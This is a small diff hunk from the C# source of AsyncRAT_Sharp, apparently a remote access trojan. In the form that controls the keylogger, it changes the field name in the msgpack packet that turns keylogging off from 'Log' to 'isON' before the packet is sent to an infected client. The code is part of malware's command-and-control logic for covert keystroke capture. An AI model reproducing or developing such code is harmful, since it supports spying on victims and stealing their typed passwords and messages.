@@ -31,7 +31,7 @@ namespace AsyncRAT_Sharp.Forms
         {
             MsgPack msgpack = new MsgPack();
             msgpack.ForcePathObject("Packet").AsString = "keyLogger";
-            msgpack.ForcePathObject("Log").AsString = "false";
+            msgpack.ForcePathObject("isON").AsString = "false";
             C.BeginSend(msgpack.Encode2Bytes());
         }
     }
